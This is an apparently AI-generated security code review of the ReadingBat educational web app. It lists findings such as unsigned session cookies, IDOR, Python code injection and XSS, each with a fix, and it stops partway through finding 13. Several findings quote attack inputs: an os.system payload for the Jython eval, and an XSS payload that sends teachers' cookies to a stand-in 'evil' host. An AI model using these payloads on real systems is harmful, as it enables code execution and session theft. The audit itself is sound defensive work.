# ReadingBat Code Review — Confirmed Findings

Multi-agent review (9 subsystems × adversarial verification). **48 confirmed** of 60 raised; 12 rejected on verification.

## Status

Updated 2026-06-15 — **48 of 48 addressed**, 0 open. `[x]` = fixed (merged to `master`, or pushed on an open branch pending PR/merge); `[ ]` = open. "covered by" items were resolved as part of another finding's fix.

### 🔴 High
- [x] **1.** Unsigned/unencrypted session cookies — PR #100
- [x] **2.** Teacher class-management IDOR — PR #101
- [x] **3.** Server-side Python code injection (RCE) — PR #96
- [x] **4.** Stored XSS via student answers over WebSocket — PR #97
- [x] **5.** JS injection via student fullName in `confirm()` — PR #98
- [x] **6.** Rate limiting installed but never enforced — PR #99
- [x] **7.** User answer eval'd in Python expression — covered by #3 (PR #96)

### 🟠 Medium
- [x] **8.** No session rotation on login (fixation) — PR #103
- [x] **9.** RateLimit never enforced (dup of #6) — covered by #6 (PR #99)
- [x] **10.** Google OAuth missing email-verified check — PR #104
- [x] **11.** GitHub callback creates blank-email user — PR #105
- [x] **12.** `convertToKotlinScript` breaks on nested braces — PR #111
- [x] **13.** `extractJavaInvocations` loses source-line order — PR #111
- [x] **14.** Attacker response count → `IndexOutOfBoundsException` — PR #109
- [x] **15.** WS publish can suspend the answer-submit handler — PR #112
- [x] **16.** REMOVE_FROM_CLASS ownership check — covered by #2 (PR #101)
- [x] **17.** Pinger CME kills ping coroutine (ChallengeWs) — PR #111
- [x] **18.** Clock pinger same CME (ClockWs) — PR #111
- [x] **19.** N+1 blocking JDBC in WS coroutine — PR #111 (partial: N+1 collapsed; IO offload & batching deferred)
- [x] **20.** Single shared dispatcher blocks all clients — PR #111
- [x] **21.** Geo cache never short-circuits the DB — PR #112
- [x] **22.** Global `Mutex` serializes all geo lookups — PR #112
- [x] **23.** `obfuscate(4)` leaks 75% of secrets — PR #106
- [x] **24.** Rate limiter single global bucket — covered by #6 (PR #99)
- [x] **25.** `getEnv(Int)` crashes startup on a non-numeric value — PR #108
- [x] **26.** Dir-contents cache key mismatch → permanent miss + leak — PR #112

### 🟡 Low
- [x] **27.** `enrolledClassCode` mutated inside DB update builder — PR #113
- [x] **28.** `findOrCreateOAuthUser` read-then-write TOCTOU — PR #113 (partial: existing-user auto-link upserted; new-user race deferred)
- [x] **29.** Blocking fetch + `runBlocking` in `computeIfAbsent` — PR #113
- [x] **30.** NPE masks intended error on null Java result — fixed on `master`
- [x] **31.** `extractJavaFunction` throws on <2 'static' lines — branch `fix-lows-batch-3`
- [x] **32.** Per-user answer channels never removed (unbounded) — branch `fix-lows-batch-3`
- [x] **33.** Logging WS requires any user, not an admin — PR #107
- [x] **34.** WS validation failures close as generic GOING_AWAY — branch `fix-lows-batch-3`
- [x] **35.** `fetchClassTeacherId()` called twice — PR #114
- [x] **36.** `geoInfoMap` caches failures permanently — branch `fix-lows-batch-3`
- [x] **37.** `geoInfosUnique` index wrong column — fixed (PR #94)
- [x] **38.** Request logging opens 3–4 transactions/request — branch `fix-lows-batch-3`
- [x] **39.** Background content load has no failure handling — branch `fix-lows-batch-3`
- [x] **40.** Self-XSS from email in `onSubmit` JS — PR #110
- [x] **41.** WS client boilerplate duplicated across 3 pages — branch `fix-lows-batch-3`
- [x] **42.** `displayStudentProgress` mixes aggregation + rendering — branch `fix-lows-batch-3`
- [x] **43.** Duplicate teacher-id lookup in authz check — PR #114
- [x] **44.** `errorOnNonInit` guard global, not per-property — branch `fix-lows-batch-3`: safe per-property guard landed (setProperty records the name; reads check `isInitialized()` = global flag OR this property set — strictly more permissive, so never throws where the old global flag didn't). The full per-property *throwing* guard remains declined as unsafe (would break `getRequiredProperty()` reads of properties set outside `initProperties()`); finding notes no functional bug
- [x] **45.** `repo` getter 'missing repo' guard is dead code — PR #114
- [x] **46.** `equalsAsPythonList` swallows non-ScriptException — obsoleted by #3 (PR #96)
- [x] **47.** `pythonAdjust` mis-parses commas/quoting in list elements — branch `fix-lows-batch-3`
- [x] **48.** `evalContent` swallows DSL failures into empty content — branch `fix-lows-batch-3`

## 1. 🔴 HIGH — Auth/session cookies are unsigned and unencrypted — trivial authentication bypass and privilege escalation

- [x] **Addressed** — PR #100

- **Category:** security | **Subsystem:** auth-users | **Verifier confidence:** high
- **Location:** `readingbat-core/src/main/kotlin/com/readingbat/server/ConfigureCookies.kt:38-78`

**Problem:** None of the three `cookie<...>()` blocks (`BrowserSession`, `UserPrincipal`, `OAuthReturnUrl`) install a `transform { ... }` with `SessionTransportTransformerSign`/`SessionTransportTransformerEncrypt`. I confirmed there is no transformer anywhere: `Installs.kt:94-98` only calls `configureSessionIdCookie/configureAuthCookie/configureOAuthReturnUrlCookie`, and a repo-wide grep for `transform`/`Transformer`/`signKey`/`encryptKey` finds nothing applied to these sessions. With Ktor's Sessions plugin and no transformer, the session value is serialized into the cookie in plaintext with no integrity protection. The `UserPrincipal` cookie holds `userId` (Cookies.kt:35) and the server trusts it directly: `ApplicationCall.userPrincipal` (Cookies.kt:93) -> `fetchUser()` (ServerUtils.kt:74) loads the user solely from that `userId`. An attacker can hand-edit the auth cookie to any `userId` and be authenticated as that user. Because `isAdminUser()` (User.kt:714) resolves admin status from the loaded user's email after lookup by the attacker-supplied `userId`, this also yields full admin/sysadmin access. `httpOnly`/`secure`/SameSite=Lax do not mitigate this — they prevent JS/cross-site access, not first-party forgery of an unsigned cookie.

**Fix:** Add cryptographic protection to every session cookie in ConfigureCookies.kt. For each `cookie<...>(name) { ... }` block (configureSessionIdCookie, configureAuthCookie, configureOAuthReturnUrlCookie), add a transformer, e.g. `transform(SessionTransportTransformerEncrypt(encryptKey, signKey))` (encrypt+sign) or at minimum `transform(SessionTransportTransformerSign(signKey))`. Load `signKey`/`encryptKey` as byte arrays from secrets/env (secrets/secrets.env via the existing SecretsEnvSource, or EnvVar) — never hard-code them, and use distinct keys for sign vs encrypt. The auth cookie (UserPrincipal) is the critical one; sign/encrypt all three for consistency. Alternatively, switch to server-side `SessionStorage` so cookies carry only an opaque random session id (this also lets you revoke sessions server-side). After deploying, rotate/invalidate existing cookies (changing the key set invalidates old unsigned cookies automatically, forcing re-login). Add a Kotest integration test that tamper-modifies the auth cookie value and asserts the request is treated as unauthenticated.

## 2. 🔴 HIGH — Teacher class-management actions lack class-ownership authorization (IDOR)

- [x] **Addressed** — PR #101

- **Category:** security | **Subsystem:** auth-users | **Verifier confidence:** high
- **Location:** `readingbat-core/src/main/kotlin/com/readingbat/common/User.kt:432-458`

**Problem:** `withdrawFromClass`/`unenrollEnrolleesClassCode` (and `deleteClassCode`/`assignActiveClassCode`) perform privileged mutations on a class identified only by a request-supplied class code or student id, with no verification that the acting user owns the class. The view pages enforce ownership (`ClassSummaryPage.kt:136`, `StudentSummaryPage.kt:112`, `WsCommon.kt:106` all check `classCode.fetchClassTeacherId() != user.userId`), but the mutating POST handlers in `TeacherPrefsPost.kt` do not. Confirmed callers: `REMOVE_FROM_CLASS` (TeacherPrefsPost.kt:95-103) reads `USER_ID_PARAM`, builds `student = studentId.toUser()`, then calls `student.withdrawFromClass(student.enrolledClassCode)` with no check that `user` owns that class; `DELETE_CLASS` (TeacherPrefsPost.kt:105, 185-213) only validates the code exists, never that `user` owns it, before `deleteClassCode()`; `updateActiveClass`/`assignActiveClassCode` (TeacherPrefsPost.kt:166-183, User.kt:359) sets the active/previous teaching class to any code without an ownership check. Any logged-in user can thus remove students from, or delete, another teacher's class by supplying its class code / a student id.

**Fix:** Add an explicit class-ownership check at the start of each mutating action in TeacherPrefsPost.kt, mirroring the view pages, and place it BEFORE any mutation/transaction.

1) Add a helper (e.g. in ClassCodeRepository or TeacherPrefsPost):
   fun requireClassOwner(user: User, classCode: ClassCode) {
     if (classCode.isNotValid() || classCode.fetchClassTeacherId() != user.userId)
       throw InvalidRequestException("User id ${user.userId} does not own class code $classCode")
   }

2) DELETE_CLASS / deleteClass: after the isNotEnabled/isNotValid guards and before the else-branch transaction, call requireClassOwner(user, classCode).

3) updateActiveClass: before user.assignActiveClassCode(classCode, true), require the user owns classCode (skip the check only for the disabled/student-mode code, since that just toggles the user's own student mode).

4) REMOVE_FROM_CLASS: do NOT trust student.enrolledClassCode as the authorization basis. Instead determine the class the teacher intends to act on (it is already known from the originating ClassSummary page — pass/validate CLASS_CODE_NAME_PARAM or equivalent), call requireClassOwner(user, classCode) first, then confirm the target student (studentId.toUser()) is actually enrolled in THAT class (student.isEnrolled(classCode)) before student.withdrawFromClass(classCode). Perform the ownership/enrollment validation before the withdrawal so the mutation cannot occur on a class the caller does not own. Centralize via requireClassOwner so the read and write paths share one authorization rule.

## 3. 🔴 HIGH — Server-side Python code injection: raw user answer is concatenated into a Jython expression and eval'd

- [x] **Addressed** — PR #96

- **Category:** security | **Subsystem:** dsl-script-eval | **Verifier confidence:** high
- **Location:** `readingbat-core/src/main/kotlin/com/readingbat/common/FunctionInfo.kt:288-294`

**Problem:** equalsAsPythonList builds `compareExpr = "${trim()} == ${correctAnswer.trim()}"` directly from the user's submitted answer (the receiver `this` is the HTTP-supplied userResponse) and passes it to `pythonEvaluatorPool.eval(compareExpr)`, which calls `engine.eval(expr)` on the Jython/JSR-223 Python engine (see common-utils AbstractExprEvaluator.eval -> engine.eval). The flow is fully attacker-controlled: ChallengePost.checkAnswers (ChallengePost.kt:198-210) reads `paramMap[RESP+i]` from `call.receiveParameters()` and passes it through FunctionInfo.checkResponse -> equalsAsPythonList for any Python list-typed challenge (correctAnswer.isBracketed()). Jython evaluates arbitrary Python with full Java interop, so a payload such as `__import__('os').system('id')==0` or `[c for c in ().__class__.__base__.__subclasses__() ...]` runs arbitrary code in the server JVM. The library's ScriptGuards.checkNoJvmExit is NOT applied on the expression-evaluator path (only on Java/Kotlin script paths) and is explicitly documented as 'not a security sandbox'. The eval result is required to be Boolean, but an attacker simply appends `== <value>` or uses a side-effecting expression that yields a bool, which is trivial. This is a remote code execution vector reachable by any unauthenticated user who can POST a challenge answer.

**Fix:** Stop feeding user input into the Jython script engine for list comparison. Mirror the already-fixed JVM path (equalsAsJvmList / parseListElements): strip the surrounding brackets from both the user response and the correct answer, split on commas, trim each element, normalize Python literals in Kotlin (single→double quotes, True/False casing, optional numeric normalization), and compare the resulting element lists structurally with `==`. This removes the engine.eval call entirely from equalsAsPythonList. If true Python evaluation semantics are ever required, first strictly whitelist the input to literal tokens only (digits, signs, decimal points, quoted string literals, True/False, brackets, commas, whitespace), reject anything else before evaluation, and run it in an out-of-process, resource-limited, sandboxed interpreter — never the in-JVM Jython engine. As defense-in-depth, also consider gating the check-answers endpoint and applying input length limits, but the structural-comparison change is the core fix.

## 4. 🔴 HIGH — Stored XSS: student-submitted answers injected into teacher dashboard via innerHTML over WebSocket

- [x] **Addressed** — PR #97

- **Category:** security | **Subsystem:** pages-large | **Verifier confidence:** high
- **Location:** `readingbat-core/src/main/kotlin/com/readingbat/pages/ChallengePage.kt:415-429`

**Problem:** On the teacher's live challenge dashboard the WebSocket onmessage handler assigns server-pushed data straight into the DOM with innerHTML: line 415 `document.getElementById(...).innerHTML = obj[likeDislikeField]` and, critically, line 429 `document.getElementById(prefix + '-$ANSWER_SPAN').innerHTML = obj[historyField][answersField]`. The `answers` payload is the raw text a student typed for a challenge. Tracing it: ChallengePost.ChallengeHistory.markIncorrect/markCorrect appends the unsanitized `userResponse` to `answers` (ChallengePost.kt:138-148), and AnswerPublisher.publishAnswers joins those raw answers with `<br>` into DashboardHistory.answers (AnswerPublisher.kt:57-59), which is serialized and emitted to the class WebSocket. The static server-side render of the same data on lines 528-529 correctly escapes it (`+answer` produces an escaped text node), but the live WS path does not. A student enrolled in a teacher's class can therefore submit an answer such as `<img src=x onerror=fetch('//evil/?c='+document.cookie)>` and have it execute in the teacher's authenticated session the moment the teacher views the challenge dashboard — a stored, cross-user XSS with privilege escalation (student -> teacher).

**Fix:** Server-side escape each answer in AnswerPublisher.publishAnswers before joining with `<br>` (lowest-effort, preserves the `<br>` separators and the existing client code). In AnswerPublisher.kt:55-60 change:

```kotlin
val dashboardHistory =
  DashboardHistory(
    history.invocation.value,
    history.correct,
    history.answers.asReversed().take(maxHistoryLength)
      .joinToString("<br>") { it.escapeHtml() },
  )
```

where escapeHtml() replaces, in order, & -> &amp;, < -> &lt;, > -> &gt;, " -> &quot;, ' -> &#39; (escape & first). This makes the innerHTML assignment on ChallengePage.kt:429 safe because the answer text is now inert while the server-controlled `<br>` separators still render.

Alternatively (more robust, defense-in-depth): send the answers as a JSON array of plain strings and have the client build the cell with textContent and explicit document.createElement('br') nodes instead of innerHTML on line 429, eliminating the HTML sink entirely. Apply the same treatment anywhere else the answers field is rendered via innerHTML. The like/dislike emoji field (line 415) is server-generated and may remain innerHTML, but escaping there too would be harmless defense-in-depth.

## 5. 🔴 HIGH — JS injection / XSS via student fullName interpolated into onSubmit confirm() string

- [x] **Addressed** — PR #98

- **Category:** security | **Subsystem:** pages-large | **Verifier confidence:** high
- **Location:** `readingbat-core/src/main/kotlin/com/readingbat/pages/StudentSummaryPage.kt:173`

**Problem:** `onSubmit = "return confirm('Are you sure you want to remove $studentName from the class?')"` interpolates `student.fullName.value` directly into a single-quoted JavaScript string literal inside an inline event handler. `fullName` is user-controlled: it comes from the registration form / OAuth provider name and is stored only length-capped (User.kt:674 `name.value.maxLength(128)`), with no character sanitization. kotlinx.html attribute-encodes the value so `<`/`>`/`"` are neutralized for the HTML attribute, but a single quote is rendered as `&#39;` which the browser decodes back to `'` before the JS parser sees it — so a student whose name is `x'); alert(document.cookie);//` breaks out of the confirm() string and runs arbitrary JS in the teacher's session when the teacher opens the Student Summary page (same vector also reachable via ClassSummaryPage.displayStudents -> removeFromClassButton). This is a stored, student-controlled XSS against teachers.

**Fix:** Stop placing user-controlled data inside the inline JS string literal. Two equivalent options:

Minimal: make the confirm message generic so no user data enters the script context:
```kotlin
onSubmit = "return confirm('Are you sure you want to remove this student from the class?')"
```
(and remove the now-unused `studentName` argument threading if desired). The student name is already shown elsewhere on the page in proper HTML text context, where kotlinx.html safely encodes `<`/`>`/`&`/`"`.

Preferred (keeps the name in the prompt, no script-context injection): move the inline handler to a data-attribute + addEventListener approach so the name is read via textContent and never parsed as JS:
```kotlin
form(classes = "m-0") {
  action = TEACHER_PREFS_ENDPOINT
  method = post
  attributes["data-student-name"] = studentName   // HTML-attr-encoded by kotlinx.html
  classes += "remove-student-form"
  ...
}
// once, in a <script>:
// document.querySelectorAll('.remove-student-form').forEach(f =>
//   f.addEventListener('submit', e => {
//     if (!confirm('Are you sure you want to remove ' + f.dataset.studentName + ' from the class?')) e.preventDefault();
//   }));
```
Note: kotlinx.html 0.12.0 does NOT escape single quotes, so any future use of fullName inside a single-quoted JS literal is unsafe — never build JS strings from interpolated user data; the same caution applies to the matching call site in ClassSummaryPage.kt:397.

## 6. 🔴 HIGH — Rate limiting is installed but never enforced — register{} without global{} is inert

- [x] **Addressed** — PR #99

- **Category:** security | **Subsystem:** config-server | **Verifier confidence:** high
- **Location:** `readingbat-core/src/main/kotlin/com/readingbat/server/Installs.kt:152-159`

**Problem:** The RateLimit plugin is configured with `register { rateLimiter(...) }` (which registers under the empty/named provider `LIMITER_NAME_EMPTY`), not `global { ... }`. In Ktor 3.5.0 the plugin's application-wide interceptor is only installed when a `global` provider is present: `RateLimit.kt:48` reads `if (global == null) return@createApplicationPlugin`. A provider registered via `register {}` is only consulted by routes explicitly wrapped in `rateLimit(name) { ... }`. A grep of the entire main source tree shows zero `rateLimit { }` route wrappers — the only references to RateLimit are the import and the install block. Net effect: the server appears to have rate limiting (it is even advertised in the Installs KDoc on line 83), but NO request is ever rate-limited. This is a real DoS/abuse exposure on auth, OAuth, and answer-check endpoints. The env vars RATE_LIMIT_COUNT/RATE_LIMIT_SECS (EnvVar.kt:55-56) feed a limiter that does nothing.

**Fix:** Switch `register {}` to `global { ... }` so the application-wide interceptor (RateLimit.kt:49) is actually installed, and add per-client keying so all clients don't share a single global bucket:

install(RateLimit) {
  global {
    rateLimiter(
      limit = EnvVar.RATE_LIMIT_COUNT.getEnv(10),
      refillPeriod = EnvVar.RATE_LIMIT_SECS.getEnv(1).seconds,
    )
    requestKey { it.request.origin.remoteHost }
  }
}

Note on keying fidelity: `call.request.origin.remoteHost` only reflects the true client IP when ForwardedHeaders/XForwardedHeaders are installed. In this codebase both are config-gated and default to false (Installs.kt:110-126), so behind a proxy the key may resolve to the proxy IP and bucket all clients together. When deployed behind a load balancer, enable the forwarded-header support (FORWARDED_ENABLED / XFORWARDED_ENABLED) for the per-client key to be meaningful, or derive the key from a trusted X-Forwarded-For parse.

Alternative (more surgical): keep `register {}` and explicitly wrap only the sensitive routes (login/auth, OAuth callbacks, answer-check POST endpoints) in `rateLimit { ... }`. This limits only what you intend rather than the whole app, but requires touching the routing files; the `global` approach is the minimal change to make the already-installed plugin actually enforce anything.

## 7. 🔴 HIGH — User answer interpolated directly into evaluated Python expression

- [x] **Addressed** — covered by #3 (PR #96)

- **Category:** security | **Subsystem:** utils-misc | **Verifier confidence:** high
- **Location:** `readingbat-core/src/main/kotlin/com/readingbat/common/FunctionInfo.kt:290-293`

**Problem:** equalsAsPythonList builds the comparison as a raw string "${trim()} == ${correctAnswer.trim()}" (line 290) where the left operand is the unsanitized userResponse, then passes it to pythonEvaluatorPool.eval which runs engine.eval on it (AbstractExprEvaluator.eval -> engine.eval). The upstream PythonScript.eval only denylists sys.exit/exit/quit/raise SystemExit (verified in script-utils-python), so an answer field value like `__import__('os').system('...') or []` is executed as Python during answer checking. The runCatching wrapper only converts thrown errors into a 'wrong answer'; it does not prevent side effects of the evaluated expression. This is the intended list-comparison mechanism, but the input is attacker-controlled (any logged-in user submitting an answer).

**Fix:** Do not evaluate user input as Python code. The JVM branch already avoids the script engine entirely: equalsAsJvmList (lines 269-281) parses both operands with parseListElements (lines 283-286) and compares element lists in Kotlin. Apply the same approach to equalsAsPythonList: strip the surrounding brackets, split on commas, trim, and compare the resulting lists structurally in Kotlin — removing the pythonEvaluatorPool.eval call entirely for list comparison. If Python-specific normalization is genuinely needed (e.g., True/False vs true/false, quote styles), normalize each parsed element in Kotlin rather than round-tripping the whole expression through Jython. If, for compatibility, the team insists on engine-based comparison, gate it behind strict validation: reject any userResponse that does not match a literal-list grammar (optional surrounding [], comma-separated tokens that are integers, floats, single/double-quoted string literals, or True/False) BEFORE constructing compareExpr. Note the upstream AbstractExprEvaluator.eval has no denylist at all, so relying on engine-level filtering is not an option here.

## 8. 🟠 MEDIUM — No session/browser-session rotation on login (session fixation)

- [x] **Addressed** — PR #103

- **Category:** security | **Subsystem:** auth-users | **Verifier confidence:** high
- **Location:** `readingbat-core/src/main/kotlin/com/readingbat/server/routes/OAuthRoutes.kt:188-200`

**Problem:** `completeOAuthLogin` sets the authenticated principal via `call.sessions.set(UserPrincipal(userId = user.userId))` but never rotates the pre-existing `BrowserSession` cookie, and there is no equivalent rotation point for the auth cookie. The anonymous `BrowserSession.id` (Cookies.kt:45) is assigned to every visitor before authentication (`AdminRoutes.assignBrowserSession`) and is the key for `UserSessionsTable`/answer history. Because the same browser-session id is carried across the login boundary unchanged, an attacker who fixes a victim's `readingbat_session_id` cookie value before login retains a session that becomes associated with the victim's user after they authenticate. This is the classic session-fixation pattern; it is amplified by the unsigned-cookie issue but is independently exploitable for the browser-session linkage.

**Fix:** In completeOAuthLogin (OAuthRoutes.kt), rotate the browser-session identifier at the authentication boundary before associating user data, so no pre-existing (possibly attacker-fixed) session id survives the privilege transition. Concretely, after determining the user but before/around setting the principal, replace the BrowserSession cookie with a freshly generated id, e.g.:

```kotlin
private suspend fun RoutingContext.completeOAuthLogin(...) {
  val user = findOrCreateOAuthUser(provider, providerId, email, name, avatarUrl)
  // Rotate browser session id to defeat session fixation across the login boundary
  call.sessions.clear<BrowserSession>()
  call.sessions.set(BrowserSession(id = randomId(15)))
  call.sessions.set(UserPrincipal(userId = user.userId))
  val returnUrl = safeRedirectPath(call.sessions.get<OAuthReturnUrl>()?.url ?: "/")
  call.sessions.clear<OAuthReturnUrl>()
  call.respondRedirect(returnUrl)
}
```

Notes:
- Since UserSessionsTable rows are keyed on sessionRef + userRef and are created lazily via queryOrCreateSessionDbmsId(), rotating the BrowserSession id means subsequent user data is keyed to the fresh, server-issued id; verify no in-flight pre-login answer data needs to be migrated to the new id (if pre-auth progress must be preserved, migrate it explicitly rather than carrying the old id forward).
- There is currently no form/password login path that sets a UserPrincipal, so no additional rotation site is required today; if a form-login path is ever added, apply the same rotation there.
- Defense-in-depth complement: add a SessionTransportTransformer (sign or encrypt) to the BrowserSession and UserPrincipal cookies in ConfigureCookies.kt so attacker-chosen cookie values are rejected outright, which independently neutralizes the fixation vector and the unsigned-cookie amplification.

## 9. 🟠 MEDIUM — RateLimit plugin is installed but never enforced on any route

- [x] **Addressed** — covered by #6 (PR #99)

- **Category:** security | **Subsystem:** oauth-routes | **Verifier confidence:** high
- **Location:** `readingbat-core/src/main/kotlin/com/readingbat/server/Installs.kt:152-159`

**Problem:** The RateLimit plugin is installed with a single `register { rateLimiter(...) }` block, which defines a limiter under `RateLimitName.Default`. In Ktor 3.x, `register` (as opposed to `global`) does NOT apply the limiter globally — it only takes effect on routes explicitly wrapped in a `rateLimit(...) { }` scope. A repo-wide search (`grep -rn "rateLimit"`) finds zero `rateLimit { }` route wrappers anywhere in main source. As a result this rate limiter is dead configuration and provides no protection: login/OAuth, check-answers (which invokes script engines), and admin POST endpoints are all unthrottled. The accompanying `RATE_LIMIT_COUNT`/`RATE_LIMIT_SECS` env vars give a false sense of protection.

**Fix:** The `register { ... }` block makes the limiter dead config because Ktor 3.5.0 only installs the application-wide interceptor when a `global { ... }` provider is configured (see RateLimit.kt: `if (global == null) return@createApplicationPlugin`). Two valid remediations:

1. Targeted (recommended): keep the `register` (give it an explicit name, e.g. `register(RateLimitName("auth")) { ... }`) and wrap sensitive routes in `rateLimit(RateLimitName("auth")) { ... }` in the routing setup — specifically OAuth login/callback (OAuthRoutes.kt), CHECK_ANSWERS_ENDPOINT (script-engine invocation), and auth/admin POST endpoints in UserRoutes.kt/AdminRoutes.kt/SysAdminRoutes.kt. Add a per-client key so clients don't share one bucket: inside the provider config add `requestKey { call -> call.request.origin.remoteHost }`.

2. App-wide: change `register { rateLimiter(...) }` to `global { rateLimiter(limit = ..., refillPeriod = ...); requestKey { call -> call.request.origin.remoteHost } }`. WARNING: without a requestKey, Ktor's default key is `Unit`, so a single shared bucket throttles ALL clients together (a self-inflicted DoS); always set requestKey when going global.

Add a Kotest integration test asserting HTTP 429 (TooManyRequests) is returned after exceeding RATE_LIMIT_COUNT requests within RATE_LIMIT_SECS against a rate-limited endpoint.

## 10. 🟠 MEDIUM — Google OAuth does not verify email before auto-linking to existing accounts (account-takeover risk)

- [x] **Addressed** — PR #104

- **Category:** security | **Subsystem:** oauth-routes | **Verifier confidence:** high
- **Location:** `readingbat-core/src/main/kotlin/com/readingbat/server/routes/OAuthRoutes.kt:172-180, 250-286`

**Problem:** completeOAuthLogin passes googleUser.email straight into the email-based auto-link path. The GoogleUser data class (lines 79-87) never parses Google's `verified_email` flag, and no `verified_email`/`email_verified` check exists anywhere in the codebase. In findOrCreateOAuthUser, when no OAuth link exists but `queryUserByEmail(email)` finds an existing user (line 252), the provider is silently linked to that account and `return existingUser` logs the OAuth caller in AS that user (lines 266-285). `queryUserByEmail` matches ANY user with that email — including password/form-registered users. The code comment on lines 264-265 explicitly claims 'both GitHub and Google only return verified emails' as the justification, but for Google that guarantee is never actually checked (it is only checked for GitHub, line 134). For Google Workspace / non-standard accounts the email need not be verified, so an attacker who can make Google assert a victim's address could take over the victim's existing ReadingBat account, including an admin account (admin status is purely email-based, User.kt:714 `email.value in adminUsers`).

**Fix:** Mirror the GitHub verification path for Google. Add the verified flag to the data class:

  @Serializable
  private data class GoogleUser(
    val id: String = "",
    val name: String? = null,
    val email: String? = null,
    @SerialName("verified_email") val verifiedEmail: Boolean = false,
    @SerialName("given_name") val givenName: String? = null,
    @SerialName("family_name") val familyName: String? = null,
    val picture: String? = null,
  )

Then in the Google callback (OAuthRoutes.kt ~line 173) only treat the email as usable when verified, so an unverified Google email falls through to new-user creation rather than auto-linking to an existing account:

  val email = if (googleUser.verifiedEmail) (googleUser.email ?: "") else ""

This routes unverified Google emails into the blank-email branch of findOrCreateOAuthUser (the `if (email.isNotBlank())` guard at line 251 is already skipped for blank emails), preventing the auto-link-to-existing-user path. Note: createOAuthUser is still called with a blank email in that case, so confirm that path is acceptable (it currently creates a user with an empty email) or additionally short-circuit/redirect with an error when no verified email is available. For stronger assurance, validate the ID token's `email_verified` claim from the `openid` flow (the scope is already requested in ConfigureOAuth.kt:118) instead of trusting the v2 userinfo endpoint. Also update/remove the misleading comment on OAuthRoutes.kt lines 264-265 once verification is actually enforced.

## 11. 🟠 MEDIUM — GitHub callback can resolve email to empty string and create a user with a blank email

- [x] **Addressed** — PR #105

- **Category:** correctness | **Subsystem:** oauth-routes | **Verifier confidence:** high
- **Location:** `readingbat-core/src/main/kotlin/com/readingbat/server/routes/OAuthRoutes.kt:127-137, 251-291`

**Problem:** When GitHub returns a private/null profile email and the /user/emails fallback finds no primary-verified or verified address, `email` collapses to "" (line 136). findOrCreateOAuthUser then skips the email-link branch because of `if (email.isNotBlank())` (line 251) and proceeds to createOAuthUser with `email = ""` (line 291, User.kt:675). Multiple GitHub users without a public/verified email all get blank-email accounts, which collide in any later `queryUserByEmail("")` lookups and pollute the unique-by-email assumption used elsewhere. It also produces accounts that can never be matched/merged with a real email.

**Fix:** Treat a missing GitHub email as "no email" consistently and never persist a literal "" that can collide on the UNIQUE(users.email) constraint. Concretely: (1) In OAuthRoutes.kt, when GitHub yields no verified email, either reject the login with a clear message ("Your GitHub account has no public/verified email; please make a verified email available and try again") OR generate a unique placeholder mirroring createUnknownUser, e.g. `"${UNKNOWN_EMAIL.value}-${randomId(4)}"`, so the UNIQUE constraint is never violated and accounts are not silently merged. (2) Add a NOT-blank guard in queryUserByEmail/isRegisteredEmail (User.kt:700) so a blank email is never matched: return null immediately when emailVal is blank. (3) Add a blank guard in createOAuthUser (User.kt:660) so it never inserts email="" directly. Rejecting the login is the safest option since a placeholder-email account can still never be matched/merged with the user's real email later.

## 12. 🟠 MEDIUM — convertToKotlinScript ends the main body on the first line starting with '}', breaking on nested braces

- [x] **Addressed** — PR #111

- **Category:** correctness | **Subsystem:** dsl-script-eval | **Verifier confidence:** high
- **Location:** `readingbat-core/src/main/kotlin/com/readingbat/dsl/parse/KotlinParse.kt:120-145`

**Problem:** convertToKotlinScript sets insideMain=true at `fun main`, then on the first line whose trimStart startsWith("}") sets insideMain=false. Any nested block inside main (an if/for/while/lambda whose closing brace is on its own line) will match `startsWith("}")` and prematurely terminate insideMain. After that, subsequent `println(...)` calls are emitted verbatim instead of being rewritten to `answers.add(...)`, so those test invocations silently produce no collected answer. This yields a mismatch between extracted invocations (extractKotlinInvocations uses linesBetween with the LAST end match, so it still collects all prints) and computed answers, and FunctionInfo.validate() will then error('Mismatch...') or, worse, silently compute wrong correctAnswers. The identical premature-termination logic exists in JavaParse.convertToScript (JavaParse.kt:142-147). PythonParse is not affected because it uses indentation-agnostic print detection.

**Fix:** Track brace depth instead of treating the first `}`-prefixed line as the end of main. In KotlinParse.convertToKotlinScript, after detecting `fun main`, count `{` minus `}` per line and only set insideMain=false (and append the closing line) when depth returns to zero. Sketch:

```kotlin
fun convertToKotlinScript(code: List<String>) =
  buildString {
    var insideMain = false
    var depth = 0
    code.forEach { line ->
      when {
        line.contains(funMainRegex) -> {
          insideMain = true
          depth = line.count { it == '{' } - line.count { it == '}' }
        }
        insideMain && line.trimStart().startsWith(PRINT_PREFIX) && depth == 1 -> {
          val expr = line.trimStart().extractBalancedContent(PRINT_PREFIX)
          appendLine("$VAR_NAME.add($expr)")
        }
        insideMain -> {
          val newDepth = depth + line.count { it == '{' } - line.count { it == '}' }
          if (newDepth <= 0) { insideMain = false } else { appendLine(line) }
          depth = newDepth
        }
        else -> appendLine(line)
      }
    }
    appendLine("")
  }
```

Symmetrically, extractKotlinInvocations should only collect prints at the top level of main rather than every println through the last brace, so the two paths agree. Apply the analogous brace-depth fix to JavaParse.convertToScript (lines 142-147) and its invocation extractor. Note that naive brace-counting still mishandles braces inside string/char literals; if challenge prints can contain `{`/`}` in string args, a small tokenizer (or reusing the literal-aware scanning already present in extractBalancedContent) would be more robust. Given the strict existing convention, an equally acceptable lighter-weight alternative is to explicitly validate/document that main must be a flat sequence of print calls and reject content that nests blocks in main, so the failure is an explicit authoring error rather than a confusing Mismatch.

## 13. 🟠 MEDIUM — extractJavaInvocations groups invocations by print-prefix, losing source-line order

- [x] **Addressed** — PR #111

- **Category:** correctness | **Subsystem:** dsl-script-eval | **Verifier confidence:** high
- **Location:** `readingbat-core/src/main/kotlin/com/readingbat/dsl/parse/JavaParse.kt:100-106`

**Problem:** extractJavaInvocations iterates `prefixes.flatMap { prefix -> code.linesBetween(...).filter { startsWith("$prefix(") } ... }`. Because the outer loop is over prefix types and the inner over lines, the resulting List<Invocation> is ordered by prefix bucket (all System.out.println invocations first, then all arrayPrint, etc.), not by their order in the source. convertToScript (JavaParse.kt:116-155), however, emits `answers.add(...)` in source-line order. For any Java challenge that mixes print prefixes (e.g., a System.out.println followed by an arrayPrint), the invocation list and the computed correctAnswers list are paired in different orders, so invocation N is shown with the wrong correct answer. Single-prefix challenges (the common case) are unaffected, which is why this is latent.

**Fix:** Iterate lines once in source order and detect the prefix per line, mirroring convertToScript's single-pass ordering:

```kotlin
fun extractJavaInvocations(code: List<String>, start: Regex, end: Regex): List<Invocation> =
  code.linesBetween(start, end)
    .map { it.trimStart() }
    .mapNotNull { line ->
      prefixes.firstOrNull { line.startsWith("$it(") }
